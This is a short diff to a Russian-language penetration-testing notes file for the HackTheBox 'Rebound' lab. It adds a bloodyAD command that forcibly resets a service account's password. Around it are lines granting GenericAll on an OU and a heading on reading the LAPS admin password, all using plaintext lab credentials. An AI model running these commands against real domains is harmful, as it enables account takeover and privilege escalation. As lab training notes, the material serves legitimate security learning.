@@ -476,6 +476,9 @@ net rpc group members "ServiceMGMT"  -U "rebound.htb"/"oorend"%'1GR8t@$$4u' -S "
 
 ./bloodyAD.py -d rebound.htb -u oorend -p '1GR8t@$$4u' --host dc01.rebound.htb  add genericAll 'OU=SERVICE USERS,DC=REBOUND,DC=HTB'  oorend		(Generic all - добавить себя в OU )
 
+./bloodyAD.py -d rebound.htb -u oorend -p '1GR8t@$$4u' --host dc01.rebound.htb  set password winrm_svc 'Password123!' 		(смена пароля при наличии прав)
+ 
+ 
  # Получение пароля LAPS Admin
 
 	Юзер состоит в групе LAPS Admin
